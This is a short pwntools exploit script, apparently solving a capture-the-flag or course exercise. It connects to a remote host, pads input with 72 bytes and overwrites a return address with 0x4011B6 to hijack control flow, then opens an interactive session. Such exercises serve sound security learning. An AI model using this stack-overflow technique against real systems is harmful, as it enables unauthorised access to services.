from pwn import *

r = remote('140.113.207.240',8834)
#r = process('./tp')
r.recvuntil('Your spell:')
targer_address = p64(0x4011B6)
r.sendline(b'a'*72 + targer_address) # 64 + 8
r.interactive()
